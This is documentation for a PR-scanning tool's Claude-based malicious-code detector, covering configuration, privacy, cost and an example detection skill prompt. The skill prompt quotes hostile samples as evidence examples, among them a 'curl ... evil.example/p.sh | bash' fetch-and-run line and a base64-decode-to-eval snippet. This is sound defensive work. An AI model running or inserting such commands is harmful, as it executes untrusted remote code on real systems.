# Claude

The Claude scanner uses Anthropic's Claude LLM to detect **malicious intent** in changed code by default - reverse shells, backdoors, obfuscated payloads, and supply-chain attacks. Default Claude settings are just a blueprint. You should definitely adapt your system prompt or use a skill instead of the default prompt.

Unlike Semgrep and Trufflehog, the Claude scanner **sends code to Anthropic's API**. It is disabled by default and must be opted in per repo. It requires `ANTHROPIC_API_KEY` to be set in the environment.


## What it detects

Claude, as it's configured by default, looks specifically for confirmed malicious patterns with high confidence:

- Reverse shells and command-and-control callbacks
- Backdoors and authentication bypasses
- Credential and secret exfiltration
- Obfuscated payloads (base64/hex encoded, eval chains)
- Supply-chain attacks (package typosquatting, postinstall hooks, dependency confusion)

Claude does **not** report style issues, bugs, or theoretical vulnerabilities. The built-in prompt instructs it to omit any finding it cannot validate with a verbatim evidence snippet from the file.


## Data privacy

Source code leaves your environment when Claude is enabled. Consider whether this is appropriate for repositories containing sensitive business logic, PII, or regulated data. If it is, a scoped custom prompt can focus analysis on a narrower threat model.

What is sent depends on the [scan mode](../configuration.md#scan-mode) configured for the repo:

- **`changed_files` mode (default):** The **full content of every changed source file** is sent - not just the changed lines. Files are capped at 50 KB each. Binary files are skipped.
- **`diff_only` mode:** Only the changed hunks plus `contextLines` lines of surrounding context are sent per file. Unchanged portions of the file are not transmitted to Anthropic's API.

**Skill mode** (described below) is explicitly not eligible for Anthropic's Zero Data Retention (ZDR) programme.


## How Layne runs it

1. Changed files are read from the workspace. Binary files (images, archives, compiled objects, fonts, etc.) are skipped.
2. Files larger than 50 KB are truncated.
3. Files are batched at 100 KB of text per API call to stay within token limits.
4. Claude is called once per batch. What is sent per file depends on scan mode:
   - **`changed_files` mode:** The full numbered file content is sent with a "Changed lines in this PR: X-Y" header.
   - **`diff_only` mode:** Only the changed hunks plus context are sent, formatted as `@@ lines X-Y @@` snippets. Line numbers within the snippet match the original file.
5. Claude calls the `report_findings` tool with its results. Line numbers are hints - Layne re-validates each finding against a verbatim evidence snippet before reporting it.
6. API errors are caught and logged without failing the scan. If some batches error, findings may be incomplete.


## Modes

Claude supports two modes, selected by what you configure in `config/layne.json`. **`skill` takes precedence over `prompt`** - if both are set, skill mode runs and `prompt` is ignored (with a warning logged).

### Prompt mode (default)

A single `messages.create` API call per batch with a system prompt. Simple, works with any Claude model, and has no external dependencies beyond the API key.

The built-in prompt instructs Claude to look for malicious intent only, require verbatim evidence for every finding, and call `report_findings` with results.

### Skill mode

Uses the [Anthropic API Skills beta](https://platform.claude.com/docs/en/build-with-claude/skills-guide). An uploaded skill runs in a sandboxed container alongside a `code_execution` tool, allowing Claude to **execute code** during analysis - decoding base64/hex payloads, querying npm/PyPI registry metadata, and doing deeper pattern matching than static reasoning allows.

Skill mode handles `pause_turn` continuations automatically (up to 10 turns per batch) for long-running analysis.

Use skill mode when you need the deeper analysis capability and have an uploaded skill available. Requires `claude-sonnet-4-6` or above - smaller models may not make effective use of code execution.

**Limitations:**
- API Skills are in active beta - beta headers (`skills-2025-10-02`, `code-execution-2025-08-25`) may be superseded by Anthropic without notice. When that happens, skill mode will stop working until Layne is updated.
- Skill IDs (`skill_01...`) are tied to your Anthropic account and are not portable.
- Not ZDR-eligible.


## Configuration

```json
{
  "owner/repo": {
    "claude": {
      "enabled": true,
      "model": "claude-haiku-4-5-20251001"
    }
  }
}
```

| Key | Type | Default | Description |
|---|---|---|---|
| `enabled` | boolean | `false` | Must be `true` to enable Claude scanning for this repo |
| `model` | string | `claude-haiku-4-5-20251001` | Claude model ID |
| `prompt` | string | built-in | Custom system prompt (prompt mode only). Replaces the default prompt entirely |
| `skill` | object | `null` | Anthropic API Skill to load (skill mode). See below. When set, `prompt` is ignored |

`skill` object:

| Key | Type | Default | Description |
|---|---|---|---|
| `id` | string | (none) | Skill ID from the Anthropic Skills API (`skill_01...`) |
| `version` | string | `"latest"` | Skill version. Pin to a specific version for reproducible behaviour |

Claude scanning is disabled by default to avoid unexpected API costs. Each repo must explicitly opt in.


## Cost

The Claude adapter makes Anthropic API calls charged per token. On a busy repository this can add up - especially if every PR is scanned immediately on open.

The most effective cost control is the `workflow_run` or `workflow_job` trigger, which defers scanning until after CI passes. PRs that fail CI quickly are not scanned at all. See [Configuration - Trigger](../configuration.md#trigger) for details.

Haiku is significantly cheaper than Sonnet and is the default model - it may not be the ideal model in terms of security analysis, though. Use Sonnet or Opus when the analysis quality difference matters (e.g. highly obfuscated code, or when using skill mode with code execution).


## Uploading a skill

Skills are managed outside of Layne via the Anthropic API. To upload one:

```python
from anthropic import Anthropic
from anthropic.lib import files_from_dir

API_KEY = "sk-ant-api03-example"

skill = Anthropic(api_key=API_KEY).beta.skills.create(
    display_title="Malicious Intent",
    files=files_from_dir("/path/to/skill-folder"),  # must contain SKILL.md
    betas=["skills-2025-10-02"],
)
print(skill.id)  # you'll use this to configure Layne
```

### Skill Tips

When creating a new skill to be used with Layne, it's important to also add to that skill the format that Layne is expecting the findings to be reported. You can use Claude Code or a different agent and ask it to create the skill in compliance with Layne's "contract". The following is an example of a skill that works with Layne in **`changed_files` mode** (the default).

:::warning Skill mode with `diff_only`
If you use skill mode together with `diff_only` scan mode, the Operating Mode section of your SKILL.md needs to be updated. In `diff_only` mode the skill receives `@@ lines X-Y @@`-delimited snippets instead of full numbered files, and there is no "Changed lines in this PR" header. The instruction to "scan the whole provided file" is not applicable - the snippet is the complete input. Update your skill instructions to describe the snippet format and to draw findings only from the provided ranges.
:::

```md
---
name: malicious-pr-scan
description: Deep malicious intent scan for GitHub Pull Requests and changed files. Focuses on confirmed malicious code, supply-chain abuse, obfuscated payloads, reverse shells, backdoors, and credential exfiltration. Designed to work well with Layne's Claude skill mode by reporting only high-confidence findings with exact verbatim evidence that uniquely maps back to one file location. Use whenever the user wants to scan a PR or changed files for suspicious or malicious code, backdoors, or supply-chain attacks.
---

# Malicious PR Scan

You are a security reviewer for malicious intent. Find only high-confidence malicious behavior or clearly hostile supply-chain changes. Do not report normal bugs, code quality issues, policy violations, or theoretical vulnerabilities.

## Operating Mode

- In Layne, you receive the full contents of changed files as numbered `text` blocks plus `Changed lines in this PR` metadata.
- Scan the whole provided file, not just the changed line ranges. The changed ranges are context only.
- Do not depend on internet lookups or package registry searches. Base conclusions on the provided code and manifests.
- Never execute repository code. Use `code_execution` only for deterministic inspection of literals such as base64, hex, unicode escapes, compressed blobs, or hashes.

## What Counts As a Finding

Report only behavior that is clearly malicious or clearly enabling malicious execution, such as:

- Reverse shells or outbound callbacks tied to process execution or stdio redirection
- Credential, token, cookie, SSH key, or environment-variable exfiltration
- Obfuscated payload delivery that decodes into code, commands, or malicious URLs
- Backdoors, hidden admin paths, secret triggers, kill switches, or covert remote command execution
- Supply-chain abuse visible in the code or manifest itself:
  - `postinstall`, `preinstall`, or `prepare` scripts that fetch or run remote code
  - direct tarball, git, or URL dependencies combined with suspicious install-time behavior
  - typosquat-like dependency names combined with concrete hostile behavior
  - new dependency bootstrap code that immediately touches shell, network, credentials, or persistence
- Dangerous dynamic execution only when the surrounding logic is clearly hostile

Do not report:

- ordinary vulnerable code with no evidence of malicious intent
- `eval`, `exec`, `spawn`, or similar APIs used in clearly benign static contexts
- packages that are merely unknown, new, niche, or low-download with no hostile behavior in the provided files
- odd or messy code that is not clearly malicious

## Evidence Contract

Every finding must survive Layne's local validator. Follow these rules exactly:

- `evidence` must be a short exact verbatim contiguous snippet copied from one file.
- Use the smallest distinctive snippet that uniquely identifies the malicious logic in that file.
- Do not paraphrase, summarize, insert ellipses, or combine non-adjacent lines.
- Do not include the prompt's line-number prefix such as `042 |`.
- If the snippet appears multiple times in the file, treat it as ambiguous. Either choose a longer exact contiguous snippet that is unique, or omit the finding.
- If you cannot provide unique exact evidence from the file, omit the finding.
- `startLine`, `endLine`, `anchorKind`, and `anchorLine` are optional hints only. They are revalidated locally and should be omitted if uncertain.
- If the malicious behavior is best described at the function, method, or class level, keep `evidence` on the exact proof snippet but set `anchorKind` to `declaration` and `anchorLine` to the declaration line.

Good evidence:

- `Buffer.from(payload, 'base64').toString('utf8')`
- `curl -fsSL https://evil.example/p.sh | bash`
- `socket.connect((host, port))`

Bad evidence:

- `decodes payload and executes it`
- `001 | eval(decoded)`
- `exec(...) ... exfiltrate token`
- two separate snippets glued together

## Preferred Workflow

1. Read the provided files and identify only code that looks intentionally malicious.
2. When you see encoding or obfuscation, use `code_execution` to decode the literal string only.
3. Verify that the decoded result or surrounding logic is clearly hostile.
4. Choose one exact contiguous evidence snippet from the file that uniquely anchors the finding.
5. Call `report_findings` once with only the surviving high-confidence findings.
6. If there are no such findings, call `report_findings` with `{"findings":[]}`.

## Output Contract

Call `report_findings` with this shape:

{
  "findings": [
    {
      "file": "path/to/file.js",
      "severity": "high",
      "message": "Base64-decoded payload is executed via eval",
      "ruleId": "decoded-payload-execution",
      "evidence": "eval(Buffer.from(payload, 'base64').toString('utf8'))",
      "startLine": 41,
      "endLine": 41,
      "anchorKind": "line",
      "anchorLine": 41
    }
  ]
}

Required fields:

- `file`
- `severity`
- `message`
- `ruleId`
- `evidence`

Guidance:

- Prefer stable short `ruleId` values in lower-kebab-case.
- Use `high` for confirmed malicious logic. Use lower severities only if the behavior is still clearly malicious but materially less severe.
- Keep `message` specific and factual.
- Prefer `anchorKind: "declaration"` when the finding is about the behavior of an enclosing function, method, or class rather than a single sink line.

## Detection Heuristics

### Obfuscated Payloads

Report encoded or constructed strings when they decode into code, commands, URLs, or shell invocations, especially if they feed `eval`, `exec`, `Function`, `child_process`, `subprocess`, `os.system`, `Runtime.exec`, or similar sinks.

### Reverse Shells And Command-And-Control

Report network connections wired to interactive shells, process execution, command dispatch, or bidirectional stdio forwarding.

### Exfiltration

Report code that gathers secrets or sensitive host data and sends it over HTTP, DNS, sockets, chat webhooks, paste sites, or other outbound channels.

### Hidden Execution Paths

Report covert admin hooks, secret trigger strings, branch-specific behavior, time bombs, kill switches, or code that selectively turns malicious under specific conditions.

### Supply-Chain Abuse

Report manifest or bootstrap changes that clearly introduce hostile execution, especially:

- install-time scripts that run remote code
- URL or git dependencies plus suspicious execution paths
- new package code in the diff that is obfuscated or exfiltrates data
- typosquat-style names only when paired with concrete hostile behavior

## Final Threshold

Before emitting a finding, verify all three:

- The behavior is clearly malicious or clearly enabling malicious execution.
- You can quote a unique exact contiguous snippet from the file.
- You would be comfortable surfacing it to a security engineer as a real alert.

If any answer is no, omit the finding.
```


## Examples

**Enable Claude with default settings (Haiku, prompt mode):**
```json
{
  "acme/frontend": {
    "claude": { "enabled": true }
  }
}
```

**Use a faster/cheaper model explicitly:**
```json
{
  "acme/frontend": {
    "claude": {
      "enabled": true,
      "model": "claude-haiku-4-5-20251001"
    }
  }
}
```

**Use a custom system prompt for domain-specific analysis:**
```json
{
  "acme/payments": {
    "claude": {
      "enabled": true,
      "model": "claude-sonnet-4-6",
      "prompt": "You are a security reviewer specialising in payment systems. Analyse the provided source files for malicious intent: reverse shells, backdoors, credential exfiltration, and supply-chain attacks. Pay extra attention to anything that could exfiltrate card data or PII. Report ONLY confirmed malicious patterns with high confidence. Call `report_findings` with your results."
    }
  }
}
```

**Use skill mode for deeper analysis:**
```json
{
  "acme/payments": {
    "claude": {
      "enabled": true,
      "model": "claude-sonnet-4-6",
      "skill": { "id": "skill_01...", "version": "latest" }
    }
  }
}
```
